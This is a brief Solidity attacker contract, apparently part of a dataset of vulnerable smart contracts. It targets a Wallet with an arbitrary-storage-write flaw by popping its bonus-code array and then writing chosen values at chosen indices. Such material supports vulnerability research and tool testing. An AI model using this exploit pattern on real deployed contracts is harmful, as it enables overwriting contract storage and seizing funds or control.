 pragma solidity ^0.4.25;

import "../dataset/access_control/arbitrary_location_write_simple.sol";

 contract WalletAttacker {
    Wallet public target;

     constructor(address _target) public {
         target = Wallet(_target);
     }

    function attack() public {
        target.PopBonusCode();
    }

    function test(uint idx, uint c) public {
        target.UpdateBonusCodeAt(idx, c);
    }
 }
